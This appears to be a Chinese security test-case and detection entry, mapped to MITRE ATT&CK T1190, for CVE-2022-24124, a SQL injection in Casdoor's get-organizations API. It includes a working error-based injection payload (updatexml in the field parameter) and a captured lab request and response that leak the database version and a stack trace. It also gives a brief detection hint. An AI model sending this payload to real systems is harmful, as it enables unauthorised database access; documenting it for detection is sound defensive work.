# T1190-CVE-2022-24124-Casdoor SQL注入漏洞

## 来自ATT&CK的描述

使用软件，数据或命令来利用面向Internet的计算机系统或程序中的弱点，从而导致意外或无法预期的行为。系统的弱点可能是错误、故障或设计漏洞。这些应用程序通常是网站，但是可以包括数据库（例如SQL），标准服务（例如SMB 或SSH）以及具有Internet可访问开放的任何其他应用程序，例如Web服务器和相关服务。根据所利用的缺陷，这可能包括“利用防御防卫”。

如果应用程序托管在基于云的基础架构上，则对其进行利用可能会导致基础实际应用受到损害。这可以使攻击者获得访问云API或利用弱身份和访问管理策略的路径。

对于网站和数据库，OWASP排名前10位和CWE排名前25位突出了最常见的基于Web的漏洞。

## 测试案例

### 简介

Casdoor是一个基于OAuth 2.0/OIDC的中心化的单点登录（SSO）身份验证平台，简单来说，就是Casdoor可以帮你解决用户管理的难题，你无需开发用户登录、注册等与用户鉴权相关的一系列功能，只需几个步骤进行简单配置，与你的主应用配合，便可完全托管你的用户模块，简单省心，功能强大。Casdoor目前作为Casbin社区项目统一使用的鉴权平台，并且项目已开源。

此漏洞属于Sql注入漏洞，在查询API存在与字段和值参数相关的SQL注入漏洞。

### 受影响版本

```yml
Casdoor < Casdoor 1.13.1 //1.13.1版本之前均受影响
```

### EXP/POC

请勿用做非法用途，仅用于检测测试。

```yml
/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),3)
```

已公开Poc：

```yml
https://github.com/cukw/CVE-2022-24124_POC
```

## 检测日志

HTTP.log

## 测试复现

参考测试留痕部分

## 测试留痕

```yml
GET /api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),3) HTTP/1.1
Host: 123.58.224.8:57939
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-TW,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: keep-alive
Referer: http://123.58.224.8:57939/api/get-organizations?p=123&pageSize=123&value=cfx&sortField=&sortOrder=&field=updatexml(1,version(),3)
Cookie: casdoor_session_id=54fbcdd93bdb8ce82c6dd4a02831a7c9
Upgrade-Insecure-Requests: 1

HTTP/1.1 200 OK
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Origin
Access-Control-Allow-Methods: GET,PUT,PATCH
Access-Control-Allow-Origin: 
Access-Control-Expose-Headers: Content-Length
Server: beegoServer:1.12.3
Date: Sun, 25 Sep 2022 14:32:58 GMT
Content-Length: 1946
Content-Type: text/html; charset=utf-8


<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>beego application error</title>
    <style>
        html, body, body * {padding: 0; margin: 0;}
        #header {background:#ffd; border-bottom:solid 2px #A31515; padding: 20px 10px;}
        #header h2{ }
        #footer {border-top:solid 1px #aaa; padding: 5px 10px; font-size: 12px; color:green;}
        #content {padding: 5px;}
        #content .stack b{ font-size: 13px; color: red;}
        #content .stack pre{padding-left: 10px;}
        table {}
        td.t {text-align: right; padding-right: 5px; color: #888;}
    </style>
    <script type="text/javascript">
    </script>
</head>
<body>
    <div id="header">
        <h2>casdoor:Error 1105: XPATH syntax error: &#39;.12-MariaDB-0&#43;deb11u1&#39;</h2>
    </div>
    <div id="content">
        <table>
            <tr>
                <td class="t">Request Method: </td><td>GET</td>
            </tr>
            <tr>
                <td class="t">Request URL: </td><td>/api/get-organizations?p=123&amp;pageSize=123&amp;value=cfx&amp;sortField=&amp;sortOrder=&amp;field=updatexml(1,version(),3)</td>
            </tr>
            <tr>
                <td class="t">RemoteAddr: </td><td>10.0.0.2</td>
            </tr>
        </table>
        <div class="stack">
            <b>Stack</b>
            <pre>/usr/local/go/src/runtime/panic.go:1038
/go/src/casdoor/object/organization.go:48
/go/src/casdoor/controllers/organization.go:45
/usr/local/go/src/reflect/value.go:543
/usr/local/go/src/reflect/value.go:339
/go/pkg/mod/github.com/astaxie/beego@v1.12.3/router.go:897
/usr/local/go/src/net/http/server.go:2879
/usr/local/go/src/net/http/server.go:1930
/usr/local/go/src/runtime/asm_amd64.s:1581
</pre>
        </div>
    </div>
    <div id="footer">
        <p>beego 1.12.3 (beego framework)</p>
        <p>golang version: go1.17.5</p>
    </div>
</body>
</html>
```

关注GET请求URL路径内容以及返回包信息，辅助研判。

## 参考推荐

MITRE-ATT&CK-T1190

<https://attack.mitre.org/techniques/T1190/>

CVE-2022-24124_POC

<https://github.com/cukw/>

